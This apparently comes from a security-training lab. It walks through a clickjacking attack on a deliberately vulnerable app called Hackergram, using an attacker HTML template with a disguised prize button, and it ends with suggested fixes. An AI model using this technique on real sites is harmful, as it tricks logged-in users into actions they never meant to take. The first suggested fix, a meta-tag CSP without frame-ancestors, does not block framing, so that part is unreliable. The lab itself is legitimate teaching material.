# Clickjacking

## Objective

This experiment demonstrates that Hackergram can be embedded inside an `<iframe>` on an attacker-controlled
page, letting the attacker overlay a deceptive UI so that a victim's genuine click actually lands on a hidden
Hackergram button. In this case, the click creates a post the victim never intended to submit.

## Affected Hackergram functionality

- `/create_post` (POST): the endpoint targeted via the hidden iframe in this walkthrough.

## Prerequisites

Simple/local deployment, plus an attacker-controlled HTTP server (`python3 -m http.server`).

## Initial state

Run `/reset` first, then log in as `mr_robot` in the victim-browser and keep the session active.

## Vulnerable implementation

Hackergram's responses carry no `X-Frame-Options` header and no `frame-ancestors`/`Content-Security-Policy`
restriction, so nothing stops another site from embedding Hackergram pages in an iframe and layering
deceptive content on top of them.

## Experiment

Create a post on behalf of a user without their knowledge by tricking them into clicking a disguised button
embedded within a malicious site. This attack exploits the fact that the Hackergram web application can be
embedded inside an iframe. In this case, the `/create_post` endpoint will be targeted.

1. Open `about:config` in the victim's webterm browser.
2. Search for `network.cookie.cookieBehavior` and set its value to `0`.
3. Login as `mr_robot` on Hackergram and keep the session active.
4. In the attacker's `/home` directory, craft a file named `clickjacking.html`. This will be a fake HTML page
   that embeds Hackergram's `/create_post` endpoint inside an iframe. You can use the template provided below
   as a starting point.

    ??? note "Clickjacking HTML"

        ``` html
        <!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Win a Prize!</title>
        <style>
            body {
                text-align: center;
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
            }
            h2 {
                color: red;
            }
            .fake-button {
                background-color: #4CAF50;
                color: white;
                padding: 15px 20px;
                font-size: 20px;
                border: none;
                cursor: pointer;
                position: absolute;
                top: 580px;
                left: 65%;
                transform: translateX(-50%);
                z-index: 10;
                pointer-events: none;
            }

            .overlay {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 5;
                pointer-events: none;
            }

        </style>
        </head>
        <body>
        <h2>Click to Win a Prize!</h2>
        <div class="overlay">
            <button class="fake-button" id="claimButton">Claim</button>
        </div>
        <script>
            window.onload = function() {
                let iframe = document.querySelector("iframe");
                let claimButton = document.getElementById("claimButton");

                iframe.addEventListener('load', function() {
                    try {
                        let iframeWindow = iframe.contentWindow;

                        iframeWindow.postMessage({
                            action: 'fillContent',
                            content: 'Hello World!'
                        }, '*');
                    } catch (error) {
                        console.error('Error accessing iframe:', error);
                    }
                });
            };

            window.addEventListener('message', function(event) {
                console.log('Received message:', event.data);
            }, false);
        </script>
        </body>
        </html>
        ```

    <details>
    <summary><strong>Tip</strong></summary>
        Use the &lt;iframe&gt; tag to embed Hackergram within the malicious site.
    </details>

5. Run an HTTP server on the attacker using `python3 -m http.server 80`. Execute this command in the
   directory used to create the HTML page in the previous step.
6. In a new tab, visit the attacker's website by entering `http://<hackergram-ip>/clickjacking.html`,
   replacing `<hackergram-ip>` with the correct host IP for your lab setup.
7. Click the "Claim Your Prize" button.
8. Confirm that the attack succeeded by checking if a new post appears under `mr_robot`'s account in
   Hackergram.

!!! note "Additional exercise"
    Try creating your own attack variation using another Hackergram endpoint. For instance, what if the
    iframe embeds a friend request action instead of a post?

## Expected result

A new post appears under `mr_robot`'s account, even though `mr_robot` only intended to click a "Claim Your
Prize" button on what looked like a prize page.

## Why it works

Without `X-Frame-Options` or a `frame-ancestors` CSP directive, browsers happily render Hackergram inside an
iframe on any origin. The attacker page positions a transparent overlay over the real, framed
"submit"/"create post" control, so the victim's click lands on Hackergram's UI element instead of the fake
button they can see.

## Reset / cleanup

Run `/reset` to remove the forged post.

## Inspect and modify

To defend against clickjacking, Hackergram must prevent its pages from being embedded into other websites.
This requires modifying files inside the Hackergram container. There are two main approaches:

1. In `base.html`, add the CSP directive:

    ``` html
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
    ```

2. In `hackergram.py`, apply the `X-Frame-Options` header to the desired responses by adding the following
   line to the returned response object:

    ```response.headers['X-Frame-Options'] = 'DENY' ```

Now, repeat the attack and verify that the clickjacking attempt is no longer effective.

## Exercise

Build a variation of this attack using a different Hackergram endpoint — for instance, what if the iframe
embeds a friend-request action instead of a post?

## Hint

<details>
<summary>💡 Hint</summary>

Any state-changing GET or POST endpoint reachable while logged in is a candidate — friend-request
accept/decline links are often simple GET requests, which makes the overlay even easier to build.

</details>
